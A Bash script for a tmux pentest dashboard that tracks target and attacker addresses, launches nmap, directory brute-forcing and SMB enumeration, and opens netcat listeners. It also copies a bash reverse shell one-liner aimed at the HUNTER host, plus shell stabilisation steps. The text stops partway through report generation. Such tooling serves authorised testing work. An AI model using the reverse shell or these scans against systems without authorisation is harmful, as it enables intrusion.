#!/usr/bin/env bash
# hacker-dash: minimal pentest dashboard for shells and tmux.
# Source it when you want the current shell to receive updated variables:
#   source ./hacker-dash.sh

# If sourced from zsh, run the Bash UI with bash, then import state back into zsh.
if [ -z "${BASH_VERSION:-}" ]; then
  if [ -n "${ZSH_VERSION:-}" ]; then
    _hd_self="${(%):-%x}"
  else
    _hd_self="$0"
  fi

  case "$_hd_self" in
    /*) ;;
    */*)
      _hd_dir="$(dirname -- "$_hd_self")"
      _hd_base="$(basename -- "$_hd_self")"
      _hd_self="$(cd -- "$_hd_dir" 2>/dev/null && pwd)/$_hd_base"
      ;;
    *) _hd_self="$(command -v -- "$_hd_self" 2>/dev/null)" ;;
  esac

  if [ -z "$_hd_self" ]; then
    printf 'hacker-dash: could not find script path\n' >&2
    return 1 2>/dev/null || exit 1
  fi

  case "${1:-}" in
    --print-env|--help|-h|--set|--clear|--doctor|--report)
      bash "$_hd_self" "$@"
      _hd_rc=$?
      ;;
    *)
      if [ -n "${TMUX:-}" ] && [ -z "${HACKER_DASH_IN_POPUP:-}" ] && [ "${1:-}" != "--no-popup" ] && command -v tmux >/dev/null 2>&1; then
        _hd_q="$(printf '%q' "$_hd_self")"
        tmux display-popup -E -w 64 -h 20 -T " hacker-dash " "HACKER_DASH_IN_POPUP=1 bash $_hd_q --no-popup"
        _hd_rc=$?
      else
        bash "$_hd_self" "$@"
        _hd_rc=$?
      fi
      ;;
  esac

  eval "$(bash "$_hd_self" --print-env)"
  unset _hd_self _hd_q _hd_dir _hd_base
  return "$_hd_rc" 2>/dev/null || exit "$_hd_rc"
fi

set +e

APP_NAME="hacker-dash"
CONFIG_DIR="${XDG_CONFIG_HOME:-$HOME/.config}/hacker-dash"
STATE_FILE="$CONFIG_DIR/state.env"
LEGACY_JSON="$CONFIG_DIR/state.json"

TARGET="${TARGET:-}"
HUNTER="${HUNTER:-}"
URL="${URL:-}"
RPORTS="${RPORTS:-}"
HD_SELECTED=0
HD_STATUS=""
HD_EXIT_AFTER_COMMAND=0
HD_QUIT_REQUESTED=0
HD_LAST_REPORT_FILE=""
HD_PREPARED_COMMAND=""
HD_LPORT=""

is_sourced() {
  [[ "${BASH_SOURCE[0]}" != "$0" ]]
}

finish() {
  local code="${1:-0}"
  if is_sourced; then
    return "$code"
  fi
  exit "$code"
}

quote_shell() {
  printf '%q' "$1"
}

script_path() {
  local src="${BASH_SOURCE[0]}"
  if [[ "$src" == */* ]]; then
    (cd -- "$(dirname -- "$src")" 2>/dev/null && printf '%s/%s\n' "$PWD" "$(basename -- "$src")")
  else
    command -v -- "$src"
  fi
}

migrate_legacy_json() {
  [[ -f "$LEGACY_JSON" ]] || return 0
  [[ -f "$STATE_FILE" ]] && return 0

  local old_target old_hunter
  old_target="$(awk -F'"' '/"target_ip"/ {print $4; exit}' "$LEGACY_JSON" 2>/dev/null)"
  old_hunter="$(awk -F'"' '/"hunter_ip"/ {print $4; exit}' "$LEGACY_JSON" 2>/dev/null)"

  [[ -n "$old_target" ]] && TARGET="$old_target"
  [[ -n "$old_hunter" ]] && HUNTER="$old_hunter"
  save_state
}

load_state() {
  mkdir -p "$CONFIG_DIR"
  migrate_legacy_json

  if [[ -f "$STATE_FILE" ]]; then
    # shellcheck source=/dev/null
    source "$STATE_FILE"
  fi
}

save_state() {
  mkdir -p "$CONFIG_DIR"
  {
    printf 'export TARGET=%s\n' "$(quote_shell "$TARGET")"
    printf 'export HUNTER=%s\n' "$(quote_shell "$HUNTER")"
    printf 'export URL=%s\n' "$(quote_shell "$URL")"
    printf 'export RPORTS=%s\n' "$(quote_shell "$RPORTS")"
  } > "$STATE_FILE"
  chmod 600 "$STATE_FILE" 2>/dev/null || true
}

export_vars() {
  export TARGET HUNTER URL RPORTS

  if [[ -n "${TMUX:-}" ]] && command -v tmux >/dev/null 2>&1; then
    tmux set-environment -g TARGET "$TARGET" 2>/dev/null || true
    tmux set-environment -g HUNTER "$HUNTER" 2>/dev/null || true
    tmux set-environment -g URL "$URL" 2>/dev/null || true
    tmux set-environment -g RPORTS "$RPORTS" 2>/dev/null || true
  fi
}

refresh_env_from_state() {
  load_state
  export_vars
}

notify_parent_shell() {
  if [[ "${HACKER_DASH_NOTIFY_PID:-}" =~ ^[0-9]+$ ]]; then
    kill -USR1 "$HACKER_DASH_NOTIFY_PID" 2>/dev/null || true
  fi
}

selected_name() {
  case "$HD_SELECTED" in
    0) printf 'TARGET' ;;
    1) printf 'HUNTER' ;;
    2) printf 'URL' ;;
    3) printf 'RPORTS' ;;
  esac
}

selected_value() {
  case "$HD_SELECTED" in
    0) printf '%s' "$TARGET" ;;
    1) printf '%s' "$HUNTER" ;;
    2) printf '%s' "$URL" ;;
    3) printf '%s' "$RPORTS" ;;
  esac
}

set_selected_value() {
  case "$HD_SELECTED" in
    0) TARGET="$1" ;;
    1) HUNTER="$1" ;;
    2) URL="$1" ;;
    3) RPORTS="$1" ;;
  esac

  save_state
  export_vars
  notify_parent_shell
}

active_url() {
  if [[ -n "$URL" ]]; then
    printf '%s' "$URL"
  elif [[ -n "$TARGET" ]]; then
    printf 'http://%s' "$TARGET"
  fi
}

first_rport() {
  local first="$RPORTS"
  first="${first%%,*}"
  printf '%s' "$first"
}

osc52_copy() {
  local text="$1" encoded
  command -v base64 >/dev/null 2>&1 || return 1
  encoded="$(printf '%s' "$text" | base64 | tr -d '\n')"

  if [[ -n "${TMUX:-}" ]]; then
    printf '\033Ptmux;\033\033]52;c;%s\a\033\\' "$encoded"
  else
    printf '\033]52;c;%s\a' "$encoded"
  fi
}

copy_clipboard() {
  local text="$1"
  [[ -z "$text" ]] && return 1

  if [[ -n "${WAYLAND_DISPLAY:-}" ]] && command -v wl-copy >/dev/null 2>&1; then
    printf '%s' "$text" | wl-copy && return 0
  fi

  if [[ -n "${DISPLAY:-}" ]] && command -v xclip >/dev/null 2>&1; then
    printf '%s' "$text" | xclip -selection clipboard && return 0
  fi

  if [[ -n "${DISPLAY:-}" ]] && command -v xsel >/dev/null 2>&1; then
    printf '%s' "$text" | xsel --clipboard --input && return 0
  fi

  if command -v pbcopy >/dev/null 2>&1; then
    printf '%s' "$text" | pbcopy && return 0
  fi

  if [[ -n "${TMUX:-}" ]] && command -v tmux >/dev/null 2>&1; then
    tmux set-buffer -w -- "$text" 2>/dev/null && return 0
    tmux set-buffer -- "$text" 2>/dev/null && return 0
  fi

  osc52_copy "$text"
}

clear_screen() {
  printf '\033[2J\033[H'
}

# Minimal, modern grayscale UI. No green.
bold=$'\033[1m'
dim=$'\033[2m'
grey=$'\033[38;5;244m'
white=$'\033[38;5;255m'
reset=$'\033[0m'

row() {
  local idx="$1" name="$2" value="$3" marker=" "
  [[ "$HD_SELECTED" -eq "$idx" ]] && marker=">"

  if [[ "$HD_SELECTED" -eq "$idx" ]]; then
    printf ' %b%s%b %b%-7s%b %s\n' "$white" "$marker" "$reset" "$bold" "$name" "$reset" "$value"
  else
    printf ' %b%s %-7s%b %s\n' "$dim" "$marker" "$name" "$reset" "$value"
  fi
}

draw_dashboard() {
  clear_screen
  printf '%b────────────────────────────────────────────%b\n' "$grey" "$reset"
  printf '  %bHACKER DASHBOARD%b\n' "$bold" "$reset"
  printf '%b────────────────────────────────────────────%b\n' "$grey" "$reset"
  row 0 'TARGET:' "$TARGET"
  row 1 'HUNTER:' "$HUNTER"
  row 2 'URL:' "$URL"
  row 3 'RPORTS:' "$RPORTS"
  printf ' %bServices:%b %s\n' "$dim" "$reset" "$(smart_service_summary)"
  printf '%b────────────────────────────────────────────%b\n' "$grey" "$reset"
  printf '  %b↑/↓ j/k%b select  %bc%b copy  %be%b edit  %br%b run  %bq%b quit\n' \
    "$dim" "$reset" "$bold" "$reset" "$bold" "$reset" "$bold" "$reset" "$bold" "$reset"
  printf '  %bo%b toolkit  %bp%b report\n' \
    "$bold" "$reset" "$bold" "$reset"

  if [[ -n "$HD_STATUS" ]]; then
    printf '\n  %b%s%b\n' "$grey" "$HD_STATUS" "$reset"
  fi
}

read_key() {
  local key rest
  IFS= read -rsn1 key || return 1
  if [[ "$key" == $'\x1b' ]]; then
    IFS= read -rsn2 -t 0.05 rest || true
    key+="$rest"
  fi
  printf '%s' "$key"
}

read_line_or_back() {
  local __var="$1" ch value=""
  while IFS= read -rsn1 ch; do
    case "$ch" in
      ''|$'\r'|$'\n')
        printf '\n'
        printf -v "$__var" '%s' "$value"
        return 0
        ;;
      $'\x7f'|$'\b')
        if [[ -z "$value" ]]; then
          printf '\n'
          printf -v "$__var" ''
          return 1
        fi
        value="${value%?}"
        printf '\b \b'
        ;;
      $'\x03')
        request_quit
        return 130
        ;;
      *)
        value+="$ch"
        printf '%s' "$ch"
        ;;
    esac
  done
  return 1
}

is_back_key() {
  [[ "$1" == $'\x7f' || "$1" == $'\b' ]]
}

request_quit() {
  HD_QUIT_REQUESTED=1
  clear_screen
}

menu_help_choose() {
  printf '\n  %b↑/↓ j/k%b select  %bEnter%b choose  %bb/Backspace%b back  %bq%b quit\n' \
    "$dim" "$reset" "$bold" "$reset" "$bold" "$reset" "$bold" "$reset"
}

menu_help_run() {
  printf '\n  %b↑/↓ j/k%b select  %bEnter%b run  %bb/Backspace%b back  %bq%b quit\n' \
    "$dim" "$reset" "$bold" "$reset" "$bold" "$reset" "$bold" "$reset"
}

menu_help_copy() {
  printf '\n  %b↑/↓ j/k%b select  %bEnter%b copy  %bb/Backspace%b back  %bq%b quit\n' \
    "$dim" "$reset" "$bold" "$reset" "$bold" "$reset" "$bold" "$reset"
}

copy_selected() {
  local name value
  name="$(selected_name)"
  value="$(selected_value)"

  export_vars
  save_state

  if [[ -z "$value" ]]; then
    HD_STATUS="$name is empty; nothing copied"
    notify_parent_shell
    return 1
  fi

  if copy_clipboard "$value"; then
    HD_STATUS="Copied $name and exported vars"
  else
    HD_STATUS="Exported vars; clipboard fallback failed"
  fi

  notify_parent_shell
}

menu_option() {
  local idx="$1" selected="$2" text="$3" marker=" "
  [[ "$idx" -eq "$selected" ]] && marker=">"

  if [[ "$idx" -eq "$selected" ]]; then
    printf ' %b%s%b %b%s%b\n' "$white" "$marker" "$reset" "$bold" "$text" "$reset"
  else
    printf ' %b%s %s%b\n' "$dim" "$marker" "$text" "$reset"
  fi
}

wait_for_back() {
  local key
  while true; do
    printf '\n  %bb/Backspace%b back  %bq%b quit' "$bold" "$reset" "$bold" "$reset"
    key="$(read_key)" || return
    if is_back_key "$key"; then
      return
    fi
    case "$key" in
      b|B) return ;;
      q|Q|$'\x03') request_quit; return ;;
    esac
  done
}

port_in_rports() {
  local wanted="$1" port
  local -a _hd_ports
  IFS=',' read -r -a _hd_ports <<< "$RPORTS"
  for port in "${_hd_ports[@]}"; do
    port="${port//[[:space:]]/}"
    [[ "$port" == "$wanted" ]] && return 0
  done
  return 1
}

has_any_port() {
  local wanted
  for wanted in "$@"; do
    port_in_rports "$wanted" && return 0
  done
  return 1
}

has_ssh_ports() {
  has_any_port 22
}

has_ftp_ports() {
  has_any_port 21
}

has_web_ports() {
  [[ -n "$URL" ]] && return 0
  has_any_port 80 81 88 3000 5000 8000 8008 8080 8081 8888 9000
}

has_tls_web_ports() {
  [[ "$URL" == https://* ]] && return 0
  has_any_port 443 4443 8443 9443
}

has_smb_ports() {
  has_any_port 139 445
}

first_matching_port() {
  local wanted
  for wanted in "$@"; do
    if port_in_rports "$wanted"; then
      printf '%s' "$wanted"
      return 0
    fi
  done
  return 1
}

smart_service_summary() {
  local services=()
  has_ftp_ports && services+=("FTP")
  has_ssh_ports && services+=("SSH")
  { has_web_ports || has_tls_web_ports; } && services+=("Web")
  has_smb_ports && services+=("SMB")

  if [[ "${#services[@]}" -eq 0 ]]; then
    if [[ -n "$RPORTS" ]]; then
      printf 'custom ports (%s)' "$RPORTS"
    else
      printf 'set RPORTS for smart suggestions'
    fi
    return 0
  fi

  local joined="" svc
  for svc in "${services[@]}"; do
    if [[ -z "$joined" ]]; then
      joined="$svc"
    else
      joined+=", $svc"
    fi
  done
  printf '%s' "$joined"
}

tool_line() {
  local tool="$1" purpose="$2"
  if command -v "$tool" >/dev/null 2>&1; then
    printf '  [OK]      %-14s %s\n' "$tool" "$purpose"
  else
    printf '  [MISSING] %-14s %s\n' "$tool" "$purpose"
  fi
}

doctor_report() {
  printf 'Dependency doctor\n'
  printf '=================\n\n'
  printf 'Core tools\n'
  tool_line bash 'script runtime'
  tool_line tmux 'Ctrl-g popup and command windows'
  tool_line curl 'HTTP probing'
  tool_line nc 'connect/listen helper'
  tool_line rlwrap 'comfortable reverse-shell listener wrapper'
  tool_line base64 'OSC52 clipboard fallback'

  printf '\nPentest tools\n'
  tool_line nmap 'baseline scanning'
  tool_line rustscan 'fast port discovery'
  tool_line whatweb 'web fingerprinting'
  tool_line nikto 'web checks'
  tool_line gobuster 'directory brute force'
  tool_line ffuf 'fuzzing'
  tool_line feroxbuster 'recursive content discovery'
  tool_line smbclient 'SMB share listing'
  tool_line enum4linux-ng 'SMB enumeration'

  printf '\nClipboard helpers\n'
  tool_line wl-copy 'Wayland clipboard'
  tool_line xclip 'X11 clipboard'
  tool_line xsel 'X11 clipboard fallback'
  tool_line pbcopy 'macOS clipboard'
}

doctor_screen() {
  clear_screen
  printf '%bDependency doctor%b\n' "$bold" "$reset"
  printf '%bCore%b\n' "$grey" "$reset"
  tool_line bash 'runtime'
  tool_line tmux 'Ctrl-g popup'
  tool_line curl 'HTTP'
  tool_line nc 'listeners'
  tool_line rlwrap 'listener wrapper'
  printf '\n%bPentest%b\n' "$grey" "$reset"
  tool_line nmap 'scan'
  tool_line rustscan 'fast scan'
  tool_line whatweb 'web'
  tool_line gobuster 'dirs'
  tool_line ffuf 'fuzz'
  tool_line smbclient 'SMB'
  printf '\n  %bc%b copy full doctor  %bb/Backspace%b back  %bq%b quit' "$bold" "$reset" "$bold" "$reset" "$bold" "$reset"

  local key
  key="$(read_key)" || return
  if is_back_key "$key" || [[ "$key" == b || "$key" == B ]]; then
    return
  fi
  case "$key" in
    c|C)
      if copy_clipboard "$(doctor_report)"; then
        HD_STATUS="Copied dependency doctor report"
      else
        HD_STATUS="Could not copy dependency doctor report"
      fi
      ;;
    q|Q|$'\x03') request_quit; return ;;
  esac
}

valid_port() {
  local port="$1"
  [[ "$port" =~ ^[0-9]+$ ]] || return 1
  (( port >= 1 && port <= 65535 ))
}

port_exists() {
  local wanted="$1" port
  local -a _hd_ports
  IFS=',' read -r -a _hd_ports <<< "$RPORTS"
  for port in "${_hd_ports[@]}"; do
    port="${port//[[:space:]]/}"
    [[ "$port" == "$wanted" ]] && return 0
  done
  return 1
}

set_rports_and_notify() {
  RPORTS="$1"
  save_state
  export_vars
  notify_parent_shell
}

add_rport() {
  local new_port
  clear_screen
  printf '%bAdd RPORT%b\n\n' "$bold" "$reset"
  printf 'Current: %s\n' "$RPORTS"
  printf 'Port to add: '
  if ! read_line_or_back new_port; then
    HD_STATUS="Add cancelled"
    return 1
  fi
  new_port="${new_port//[[:space:]]/}"

  if [[ -z "$new_port" ]]; then
    HD_STATUS="Add cancelled"
    return 1
  fi
  if ! valid_port "$new_port"; then
    HD_STATUS="Invalid port: $new_port"
    return 1
  fi
  if port_exists "$new_port"; then
    HD_STATUS="Port $new_port already exists"
    return 1
  fi

  if [[ -z "$RPORTS" ]]; then
    set_rports_and_notify "$new_port"
  else
    set_rports_and_notify "$RPORTS,$new_port"
  fi
  HD_STATUS="Added port $new_port to RPORTS"
}

delete_rport() {
  local ports=() port key selected=0 max i new_rports=""
  if [[ -z "$RPORTS" ]]; then
    HD_STATUS="RPORTS is empty; nothing to delete"
    return 1
  fi

  IFS=',' read -r -a ports <<< "$RPORTS"
  for i in "${!ports[@]}"; do
    ports[$i]="${ports[$i]//[[:space:]]/}"
  done
  max=$((${#ports[@]} - 1))

  while true; do
    menu_header "Delete RPORT"
    for i in "${!ports[@]}"; do
      menu_option "$i" "$selected" "${ports[$i]}"
    done
    printf '\n  %bEnter%b delete  %bb/Backspace%b back  %bq%b quit\n' "$bold" "$reset" "$bold" "$reset" "$bold" "$reset"

    key="$(read_key)" || return
    if is_back_key "$key"; then
      HD_STATUS="Delete cancelled"
      return
    fi
    case "$key" in
      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
      b|B) HD_STATUS="Delete cancelled"; return ;;
      ''|$'\r'|$'\n')
        local deleted_port="${ports[$selected]}"
        unset 'ports[selected]'
        for port in "${ports[@]}"; do
          [[ -z "$port" ]] && continue
          if [[ -z "$new_rports" ]]; then
            new_rports="$port"
          else
            new_rports+=",$port"
          fi
        done
        set_rports_and_notify "$new_rports"
        HD_STATUS="Deleted port $deleted_port; RPORTS updated"
        return
        ;;
      q|Q|$'\x03') request_quit; return ;;
    esac
  done
}

replace_rports() {
  local new_value
  clear_screen
  printf '%bReplace RPORTS%b\n\n' "$bold" "$reset"
  printf 'Current: %s\n' "$RPORTS"
  printf 'Example: 22,80,443,8080\n'
  printf 'New value: '
  if ! read_line_or_back new_value; then
    HD_STATUS="RPORTS unchanged"
    return 1
  fi
  if [[ -z "$new_value" ]]; then
    HD_STATUS="RPORTS unchanged"
    return 0
  fi
  set_rports_and_notify "$new_value"
  HD_STATUS="Replaced RPORTS and exported vars"
}

rports_menu() {
  local key selected=0 max=2
  while true; do
    menu_header "Manage RPORTS"
    printf '  Current: %s\n\n' "${RPORTS:-<empty>}"
    menu_option 0 "$selected" "Replace full list"
    menu_option 1 "$selected" "Add one port"
    menu_option 2 "$selected" "Delete one port"
    menu_help_choose

    key="$(read_key)" || return
    if is_back_key "$key"; then
      return
    fi
    case "$key" in
      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
      1) replace_rports; return ;;
      2) add_rport; return ;;
      3) delete_rport; return ;;
      b|B) return ;;
      q|Q|$'\x03') request_quit; return ;;
      ''|$'\r'|$'\n')
        case "$selected" in
          0) replace_rports; return ;;
          1) add_rport; return ;;
          2) delete_rport; return ;;
        esac
        ;;
    esac
  done
}

edit_selected() {
  local name current new_value
  name="$(selected_name)"
  current="$(selected_value)"

  if [[ "$name" == "RPORTS" ]]; then
    rports_menu
    return
  fi

  if [[ "$name" == "URL" ]]; then
    url_helper_menu
    return
  fi

  clear_screen
  printf '%bEdit %s%b\n\n' "$bold" "$name" "$reset"
  printf 'Current: %s\n' "$current"
  if [[ "$name" == "URL" ]]; then
    printf 'Example: http://10.10.10.10 or https://host:8443\n'
  fi
  printf 'New value: '
  if ! read_line_or_back new_value; then
    HD_STATUS="$name unchanged"
    return 1
  fi
  if [[ -z "$new_value" ]]; then
    HD_STATUS="$name unchanged"
    return 0
  fi

  set_selected_value "$new_value"
  HD_STATUS="Updated $name and exported vars"
}

prepare_command() {
  local title="$1" cmd="$2" key edited
  HD_PREPARED_COMMAND="$cmd"

  if [[ ! -t 0 ]]; then
    HD_PREPARED_COMMAND="$cmd"
    printf '%s' "$cmd"
    return 0
  fi

  while true; do
    clear_screen
    printf '%b%s%b\n\n' "$bold" "$title" "$reset"
    printf '%bPreview command%b\n' "$grey" "$reset"
    printf '%s\n\n' "$cmd"
    printf '  %bEnter%b run  %be%b edit  %bc%b copy  %bb/Backspace%b back  %bq%b quit' \
      "$bold" "$reset" "$bold" "$reset" "$bold" "$reset" "$bold" "$reset" "$bold" "$reset"

    key="$(read_key)" || return 1
    if is_back_key "$key"; then
      return 1
    fi
    case "$key" in
      ''|$'\r'|$'\n')
        HD_PREPARED_COMMAND="$cmd"
        return 0
        ;;
      e|E)
        clear_screen
        printf '%bEdit command%b\n\n' "$bold" "$reset"
        printf 'Current:\n%s\n\n' "$cmd"
        printf 'New command: '
        read_line_or_back edited || edited=""
        [[ -n "$edited" ]] && cmd="$edited"
        ;;
      c|C)
        if copy_clipboard "$cmd"; then
          HD_STATUS="Copied command preview"
        else
          HD_STATUS="Clipboard copy failed"
        fi
        ;;
      b|B) return 1 ;;
      q|Q|$'\x03') request_quit; return 1 ;;
    esac
  done
}

write_command_script() {
  local cmd="$1" script cwd
  cwd="$PWD"
  script="$(mktemp "${TMPDIR:-/tmp}/hacker-dash-run.XXXXXX.sh")" || return 1

  {
    printf '#!/usr/bin/env bash\n'
    printf 'set +e\n'
    printf 'cd %s || exit 1\n' "$(quote_shell "$cwd")"
    printf "printf 'Command: %%s\\n\\n' %s\n" "$(quote_shell "$cmd")"
    printf '%s\n' "$cmd"
    printf 'rc=$?\n'
    printf "printf '\\n[exit %%s] Press Enter to close...' \"\$rc\"\n"
    printf 'IFS= read -r _\n'
    printf 'rm -f -- "$0"\n'
    printf 'exit "$rc"\n'
  } > "$script"

  chmod 700 "$script" || return 1
  printf '%s' "$script"
}

launch_terminal_command() {
  local title="$1" cmd="$2" script
  prepare_command "$title" "$cmd" || {
    [[ "$HD_QUIT_REQUESTED" -eq 1 ]] && return 1
    HD_STATUS="Command cancelled"
    return 1
  }
  cmd="$HD_PREPARED_COMMAND"

  export_vars
  save_state

  if [[ -n "${TMUX:-}" ]] && command -v tmux >/dev/null 2>&1; then
    script="$(write_command_script "$cmd")" || {
      HD_STATUS="Could not create command runner"
      return 1
    }
    tmux new-window -c "$PWD" -n "$title" "bash $(quote_shell "$script")"
    HD_STATUS="Launched $title in a tmux window"
    HD_EXIT_AFTER_COMMAND=1
  else
    clear_screen
    printf '%b%s%b\n\n' "$bold" "$title" "$reset"
    printf '%bCommand:%b %s\n\n' "$grey" "$reset" "$cmd"
    bash -lc "$cmd"
    local rc=$?
    printf '\n[exit %s] Press Enter to return...' "$rc"
    IFS= read -r _
    HD_STATUS="$title finished with exit $rc"
  fi
}

require_target() {
  if [[ -z "$TARGET" ]]; then
    HD_STATUS="Set TARGET first"
    return 1
  fi
  return 0
}

require_url() {
  if [[ -z "$(active_url)" ]]; then
    HD_STATUS="Set URL or TARGET first"
    return 1
  fi
  return 0
}

require_rports() {
  if [[ -z "$RPORTS" ]]; then
    HD_STATUS="Set RPORTS first, e.g. 22,80,443"
    return 1
  fi
  return 0
}

run_nmap_quick() {
  require_target || return
  launch_terminal_command "hd-nmap" "mkdir -p scans; nmap -sC -sV -oA scans/tcp $(quote_shell "$TARGET")"
}

run_nmap_rports() {
  require_target || return
  require_rports || return
  launch_terminal_command "hd-nmap-ports" "mkdir -p scans; nmap -sC -sV -p $(quote_shell "$RPORTS") -oA scans/rports $(quote_shell "$TARGET")"
}

run_nmap_allports() {
  require_target || return
  launch_terminal_command "hd-nmap-all" "mkdir -p scans; nmap -p- --min-rate 5000 -oA scans/allports $(quote_shell "$TARGET")"
}

run_rustscan() {
  require_target || return
  launch_terminal_command "hd-rustscan" "mkdir -p scans; rustscan -a $(quote_shell "$TARGET") -- -sC -sV"
}

run_whatweb() {
  require_url || return
  local url
  url="$(active_url)"
  launch_terminal_command "hd-whatweb" "whatweb $(quote_shell "$url")"
}

run_nikto() {
  require_url || return
  local url
  url="$(active_url)"
  launch_terminal_command "hd-nikto" "mkdir -p scans; nikto -h $(quote_shell "$url") -output scans/nikto.txt"
}

run_gobuster_dir() {
  require_url || return
  local url
  url="$(active_url)"
  launch_terminal_command "hd-gobuster" "mkdir -p scans; wordlist=\${WORDLIST:-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt}; gobuster dir -u $(quote_shell "$url") -w \"\$wordlist\" -o scans/gobuster.txt"
}

run_ffuf_dir() {
  require_url || return
  local url
  url="$(active_url)"
  launch_terminal_command "hd-ffuf" "mkdir -p scans; wordlist=\${WORDLIST:-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt}; ffuf -u $(quote_shell "$url/FUZZ") -w \"\$wordlist\" -o scans/ffuf.json"
}

run_feroxbuster() {
  require_url || return
  local url
  url="$(active_url)"
  launch_terminal_command "hd-ferox" "mkdir -p scans; wordlist=\${WORDLIST:-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt}; feroxbuster -u $(quote_shell "$url") -w \"\$wordlist\" -o scans/feroxbuster.txt"
}

run_smbclient() {
  require_target || return
  launch_terminal_command "hd-smb" "smbclient -L //$(quote_shell "$TARGET") -N"
}

run_enum4linux() {
  require_target || return
  launch_terminal_command "hd-enum4linux" "enum4linux-ng $(quote_shell "$TARGET")"
}

run_nmap_smb() {
  require_target || return
  launch_terminal_command "hd-smb-nmap" "mkdir -p scans; nmap --script smb-enum-shares,smb-enum-users -p445 -oA scans/smb $(quote_shell "$TARGET")"
}

run_nmap_ssh() {
  require_target || return
  launch_terminal_command "hd-ssh-nmap" "mkdir -p scans; nmap -sV -p22 --script ssh-hostkey,ssh2-enum-algos -oA scans/ssh $(quote_shell "$TARGET")"
}

run_nmap_ftp() {
  require_target || return
  launch_terminal_command "hd-ftp-nmap" "mkdir -p scans; nmap -sV -p21 --script ftp-anon,ftp-syst,ftp-bounce -oA scans/ftp $(quote_shell "$TARGET")"
}

run_ping() {
  require_target || return
  launch_terminal_command "hd-ping" "ping -c 4 $(quote_shell "$TARGET")"
}

run_curl_headers() {
  require_url || return
  local url
  url="$(active_url)"
  launch_terminal_command "hd-curl" "curl -iL $(quote_shell "$url")"
}

run_nc_connect() {
  require_target || return
  require_rports || return
  local port
  port="$(first_rport)"
  launch_terminal_command "hd-nc" "nc -nv $(quote_shell "$TARGET") $(quote_shell "$port")"
}

prompt_lport() {
  local default_port="${1:-4444}" port
  HD_LPORT=""
  clear_screen
  printf '%bListener port%b\n\n' "$bold" "$reset"
  printf 'Default: %s\n' "$default_port"
  printf 'LPORT: '
  if ! read_line_or_back port; then
    HD_STATUS="Listener port unchanged"
    return 1
  fi
  port="${port//[[:space:]]/}"
  [[ -z "$port" ]] && port="$default_port"
  if ! valid_port "$port"; then
    HD_STATUS="Invalid listener port: $port"
    return 1
  fi
  HD_LPORT="$port"
}

run_nc_listener() {
  local port
  prompt_lport 4444 || return
  port="$HD_LPORT"
  launch_terminal_command "hd-listener" "nc -lvnp $(quote_shell "$port")"
}

run_rlwrap_listener() {
  local port
  prompt_lport 4444 || return
  port="$HD_LPORT"
  launch_terminal_command "hd-rlwrap-listener" "rlwrap -cAr nc -lvnp $(quote_shell "$port")"
}

copy_text_status() {
  local label="$1" text="$2"
  if copy_clipboard "$text"; then
    HD_STATUS="Copied $label"
  else
    HD_STATUS="Could not copy $label"
  fi
}

bash_reverse_shell() {
  local port
  [[ -n "$HUNTER" ]] || { HD_STATUS="Set HUNTER/LHOST first"; return 1; }
  prompt_lport 4444 || return
  port="$HD_LPORT"
  copy_text_status "bash reverse shell" "bash -c 'bash -i >& /dev/tcp/$HUNTER/$port 0>&1'"
}

copy_pty_upgrade() {
  copy_text_status "PTY upgrade" "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'; export TERM=xterm; stty rows 40 cols 120"
}

copy_stabilize_steps() {
  copy_text_status "shell stabilize steps" $'python3 -c '\''import pty; pty.spawn("/bin/bash")'\''\nCtrl-Z\nstty raw -echo; fg\nreset\nexport TERM=xterm\nstty rows 40 cols 120'
}

cheat_export_vars() {
  printf 'export TARGET=%s HUNTER=%s URL=%s RPORTS=%s' \
    "$(quote_shell "$TARGET")" "$(quote_shell "$HUNTER")" "$(quote_shell "$URL")" "$(quote_shell "$RPORTS")"
}

cheat_nmap_quick() {
  printf 'mkdir -p scans; nmap -sC -sV -oA scans/tcp %s' "$(quote_shell "$TARGET")"
}

cheat_nmap_rports() {
  printf 'mkdir -p scans; nmap -sC -sV -p %s -oA scans/rports %s' "$(quote_shell "$RPORTS")" "$(quote_shell "$TARGET")"
}

cheat_gobuster() {
  local url
  url="$(active_url)"
  printf 'mkdir -p scans; wordlist=${WORDLIST:-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt}; gobuster dir -u %s -w "$wordlist" -o scans/gobuster.txt' "$(quote_shell "$url")"
}

cheat_ffuf() {
  local url
  url="$(active_url)"
  printf 'mkdir -p scans; wordlist=${WORDLIST:-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt}; ffuf -u %s -w "$wordlist" -o scans/ffuf.json' "$(quote_shell "$url/FUZZ")"
}

report_step() {
  local number="$1" text="$2"
  printf '%s. %s\n' "$number" "$text"
}

generate_report() {
  load_state
  local services url scan_dir generated step
  services="$(smart_service_summary)"
  url="$(active_url)"
  scan_dir="$PWD/scans"
  generated="$(date '+%Y-%m-%d %H:%M:%S %Z' 2>/dev/null || printf 'unknown')"
  step=1

  printf '# Professional Pentest Brief\n\n'
  printf -- '- Generated: %s\n' "$generated"
  printf -- '- Target: %s\n' "${TARGET:-not set}"
  printf -- '- Hunter/LHOST: %s\n' "${HUNTER:-not set}"
  printf -- '- Primary URL: %s\n' "${url:-not set}"
  printf -- '- Reported ports: %s\n' "${RPORTS:-not set}"
  printf -- '- Detected services: %s\n' "$services"
  printf -- '- Scan directory: %s\n\n' "$scan_dir"

  printf '## Recommended next steps\n'
  report_step "$step" 'Baseline: run nmap quick scripts/services and save output under scans/.'; ((step++))
  [[ -n "$RPORTS" ]] && { report_step "$step" "Validate discovered ports: run nmap selected RPORTS against $RPORTS."; ((step++)); }
  if has_web_ports || has_tls_web_ports; then
    report_step "$step" "Web: run whatweb, curl headers, and one directory brute-force tool against ${url:-the selected URL}."; ((step++))
  fi
  if has_smb_ports; then
    report_step "$step" 'SMB: list shares anonymously, run enum4linux-ng, and run nmap SMB scripts.'; ((step++))
  fi
  if has_ssh_ports; then
    report_step "$step" 'SSH: capture host keys/algorithms and keep credentials testing manual and authorized.'; ((step++))
  fi
  if has_ftp_ports; then
    report_step "$step" 'FTP: check anonymous login and run safe FTP nmap scripts.'; ((step++))
  fi
  printf '\n## Copy-ready commands\n'
